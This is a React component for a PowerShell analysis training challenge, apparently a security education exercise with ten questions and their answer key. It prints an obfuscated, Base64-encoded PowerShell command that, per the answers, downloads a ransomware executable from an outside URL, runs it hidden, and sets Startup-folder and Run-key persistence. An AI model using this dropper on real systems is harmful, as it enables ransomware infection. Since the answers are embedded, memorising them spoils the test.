import React, { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';
import { ArrowLeft, CheckCircle2, XCircle, HelpCircle } from 'lucide-react';
import Confetti from 'react-confetti';

interface Question {
  id: number;
  text: string;
  answer: string;
  hint?: string; // Optional hint for each question
  userAnswer?: string;
  isCorrect?: boolean;
  showHint?: boolean; // State to toggle hint visibility
}

function PowerShellChallenge() {
  const [questions, setQuestions] = useState<Question[]>([
    {
      id: 1,
      text: "1. What encoding method does the script use?",
      answer: "Base64",
      hint: "Look for a common encoding technique often used for obfuscation.",
    },
    {
      id: 2,
      text: "2. What is the URL from which the malicious file is downloaded?",
      answer: "http://uhxqin.biz/csgeaivqpodqs/5849b1b61e88f7461064b986a204b9c7_wannacry.exe",
      hint: "The URL is part of the PowerShell command, check for the full string.",
    },
    {
      id: 3,
      text: "3. What is the hash of the downloaded malware file?",
      answer: "5849b1b61e88f7461064b986a204b9c7",
      hint: "The hash is often a part of the file’s metadata, check the script for it.",
    },
    {
      id: 4,
      text: "4. What type of malware is being delivered by this script?",
      answer: "Ransomware",
      hint: "Consider the impact of the encryption process mentioned in the introduction.",
    },
    {
      id: 5,
      text: "5. What is the name of the downloaded file?",
      answer: "update_service.exe",
      hint: "The file name is mentioned in the PowerShell command.",
    },
    {
      id: 6,
      text: "6. Which PowerShell command is used to download the file?",
      answer: "Invoke-WebRequest -Uri $update -OutFile $destinationPath",
      hint: "Search for the download command within the script.",
    },
    {
      id: 7,
      text: "7. Where is the file stored on the system before execution?",
      answer: "TEMP",
      hint: "Check the file path in the command for where the file is stored.",
    },
    {
      id: 8,
      text: "8. Which command is used to execute the downloaded file?",
      answer: "Start-Process -FilePath $destinationPath -WindowStyle Hidden",
      hint: "Look for a command that runs an executable file in the script.",
    },
    {
      id: 9,
      text: "9. Which method does the script use to maintain persistence?",
      answer: "Startup folder",
      hint: "Persistence is often achieved by placing the file in a location that runs on startup.",
    },
    {
      id: 10,
      text: "10. Which Windows registry key is modified to establish persistence?",
      answer: "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      hint: "Persistence is often achieved through Windows registry keys.",
    },
  ]);

  const [timeTaken, setTimeTaken] = useState(0); // Time in seconds
  const [timerRunning, setTimerRunning] = useState(true);
  const [hintsRemaining, setHintsRemaining] = useState(3); // Limit to 3 hints

  // Timer logic
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (timerRunning) {
      interval = setInterval(() => {
        setTimeTaken((prev) => prev + 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [timerRunning]);

  // Stop the timer when all questions are answered
  const allQuestionsAnswered = questions.every((q) => q.isCorrect !== undefined);
  useEffect(() => {
    if (allQuestionsAnswered) {
      setTimerRunning(false);
    }
  }, [allQuestionsAnswered]);

  // Handle answer submission
  const handleAnswerSubmit = (id: number, answer: string) => {
    setQuestions(
      questions.map((q) => {
        if (q.id === id) {
          return {
            ...q,
            userAnswer: answer.toLowerCase(),
            isCorrect: answer.toLowerCase() === q.answer.toLowerCase(),
          };
        }
        return q;
      })
    );
  };

  // Toggle hint visibility
  const toggleHint = (id: number) => {
    if (hintsRemaining > 0) {
      setQuestions(
        questions.map((q) => {
          if (q.id === id && !q.showHint) {
            setHintsRemaining(hintsRemaining - 1);
            return {
              ...q,
              showHint: true,
            };
          }
          return q;
        })
      );
    }
  };

  // Reset challenge
  const resetChallenge = () => {
    setQuestions(
      questions.map((q) => ({
        ...q,
        userAnswer: undefined,
        isCorrect: undefined,
        showHint: false,
      }))
    );
    setTimeTaken(0);
    setTimerRunning(true);
    setHintsRemaining(3);
  };

  const correctAnswersCount = questions.filter((q) => q.isCorrect).length;
  const totalQuestions = questions.length;
  const progress = (correctAnswersCount / totalQuestions) * 100;

  return (
    <div className="min-h-screen bg-background text-white">
      {/* Navigation */}
      <nav className="bg-primary-dark border-b border-primary-blue/20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between h-16 items-center">
            <div className="flex items-center space-x-4">
              <Link to="/challenges" className="text-primary-blue hover:text-primary-blue/80 flex items-center">
                <ArrowLeft className="w-5 h-5 mr-2" />
                Back to Challenges
              </Link>
            </div>
          </div>
        </div>
      </nav>

      {/* Banner with Hover Effects and Glow Border */}
      <div className="flex justify-center mb-12">
        <div className="relative group">
          {/* Glow Border */}
          <div className="absolute inset-0 rounded-lg bg-primary-blue/40 blur-lg group-hover:opacity-100 opacity-0 transition-opacity duration-300"></div>

          {/* Banner Image */}
          <img
            src="/powershell-banner.jpg"
            alt="PowerShell Challenge Banner"
            className="w-auto max-h-80 object-cover rounded-lg shadow-lg group-hover:scale-105 group-hover:rotate-1 transition-transform duration-300 ease-in-out relative z-10"
          />
        </div>
      </div>

      {/* Challenge Content */}
      <div className="max-w-4xl mx-auto px-4 py-12 -mt-16 relative z-10">
        <h1 className="text-3xl font-bold mb-8">PowerShell Analysis Challenge</h1>

        {/* Timer */}
        <div className="text-center mb-6">
          <p className="text-gray-400">
            Time Taken: {Math.floor(timeTaken / 60)}:{timeTaken % 60 < 10 ? `0${timeTaken % 60}` : timeTaken % 60}
          </p>
        </div>

        {/* Improved Progress Bar */}
        <div className="mb-6">
          <div className="text-lg font-semibold mb-2">Progress</div>
          <div className="w-full bg-primary-dark/20 h-4 rounded-full relative overflow-hidden">
            <div
              className="h-4 rounded-full transition-all duration-500 ease-in-out"
              style={{
                width: `${progress}%`,
                background: 'linear-gradient(90deg, #4ade80, #3b82f6)', // Gradient colors
                boxShadow: '0 0 8px rgba(59, 130, 246, 0.6)', // Glow effect
              }}
            >
              {/* Progress Percentage Label */}
              <div className="text-center text-white text-sm font-semibold absolute inset-0 flex items-center justify-center">
                {`${Math.round(progress)}%`}
              </div>
            </div>
          </div>
          <div className="text-sm mt-2 text-gray-400">
            {correctAnswersCount} of {totalQuestions} correct
          </div>
        </div>

        {/* Hints Remaining */}
        <div className="text-gray-400 mb-6">
          Hints Remaining: {hintsRemaining}
        </div>

        {/* Reset Button */}
        <div className="text-center mb-6">
          <button
            onClick={resetChallenge}
            className="bg-red-600 text-white py-2 px-4 rounded-lg hover:bg-red-700 transition-all"
          >
            Reset Challenge
          </button>
        </div>

        {/* Introduction */}
        <div className="bg-primary-dark/30 rounded-lg p-6 border border-primary-blue/20 mb-8">
          <h2 className="text-xl font-semibold mb-4">Challenge Introduction</h2>
          <p className="text-gray-400 mb-6">
            An endpoint within your organization was suddenly encrypted, leaving critical files inaccessible.
            The IT team discovered that a PowerShell command was executed shortly before the encryption occurred,
            and they need your expertise to understand what happened and how it led to the encryption.
          </p>

          {/* PowerShell Command in a Border */}
          <div className="bg-background border border-primary-blue/40 p-4 rounded-lg shadow-md overflow-x-auto">
            <pre className="text-gray-300 font-mono whitespace-pre-wrap break-words">
              powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand JHVwZGF0ZSA9ICJodHRwOi8vdWh4cWluLmJpei9jc2dlYWl2cXBvZHFzLzU4NDliMWI2MWU4OGY3NDYxMDY0Yjk4NmEyMDRiOWM3X3dhbm5hY3J5LmV4ZSIgIA0KJGRlc3RpbmF0aW9uUGF0aCA9ICIkZW52OlRFTVBcdXBkYXRlX3NlcnZpY2UuZXhlIg0KDQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cGRhdGUgLU91dEZpbGUgJGRlc3RpbmF0aW9uUGF0aA0KDQpTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkZGVzdGluYXRpb25QYXRoIC1XaW5kb3dTdHlsZSBIaWRkZW4NCg0KJHN0YXJ0dXBQYXRoID0gIiRlbnY6QVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBcdXBkYXRlX3NlcnZpY2UuZXhlIg0KQ29weS1JdGVtIC1QYXRoICRkZXN0aW5hdGlvblBhdGggLURlc3RpbmF0aW9uICRzdGFydHVwUGF0aCAtRm9yY2UNCg0KTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIiAtTmFtZSAiVXBkYXRlU2VydmljZSIgLVZhbHVlICRkZXN0aW5hdGlvblBhdGggLVByb3BlcnR5VHlwZSBTdHJpbmcgLUZvcmNlDQoNCiRlbmNvZGVkQ29tbWFuZCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygncG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLU5vUHJvZmlsZSAtV2luZG93U3R5bGUgSGlkZGVuIC1GaWxlICcgKyAkZGVzdGluYXRpb25QYXRoKSkNClN0YXJ0LVByb2Nlc3MgInBvd2Vyc2hlbGwuZXhlIiAtQXJndW1lbnRMaXN0ICJSZWNvZ25pemVkIGNvbXBhY3QtMC4==
            </pre>
          </div>
        </div>

        {/* Questions */}
        <div className="space-y-6">
          {questions.map((question) => (
            <div
              key={question.id}
              className="bg-primary-dark/30 rounded-lg p-6 border border-primary-blue/20 hover:bg-primary-dark/40 hover:border-primary-blue transition-all"
            >
              <div className="flex items-start justify-between">
                <div className="flex-1">
                  <h3 className="text-lg font-semibold mb-4">{question.text}</h3>
                  <div className="flex items-center space-x-4">
                    <input
                      type="text"
                      className="bg-background border border-primary-blue/20 rounded-md px-4 py-2 focus:outline-none focus:border-primary-blue"
                      placeholder="Enter your answer"
                      onChange={(e) => handleAnswerSubmit(question.id, e.target.value)}
                    />
                    <button
                      className="text-gray-500 hover:text-gray-400"
                      onClick={() => toggleHint(question.id)}
                    >
                      <HelpCircle className="w-5 h-5" />
                    </button>
                    {question.userAnswer && (
                      question.isCorrect ? (
                        <CheckCircle2 className="w-6 h-6 text-green-500" />
                      ) : (
                        <XCircle className="w-6 h-6 text-red-500" />
                      )
                    )}
                  </div>
                  {question.showHint && (
                    <div className="mt-4 text-gray-300 italic">{question.hint}</div>
                  )}
                </div>
              </div>
            </div>
          ))}
        </div>

        {/* Feedback Section with Confetti */}
        {allQuestionsAnswered && (
          <>
            <Confetti width={window.innerWidth} height={window.innerHeight} />
            <div className="mt-8 p-4 bg-green-600 text-white rounded-lg text-center">
              <p className="text-lg font-semibold">Congratulations!</p>
              <p>You have completed the challenge with {correctAnswersCount} out of {totalQuestions} correct answers.</p>
            </div>
          </>
        )}
      </div>
    </div>
  );
}

export default PowerShellChallenge;
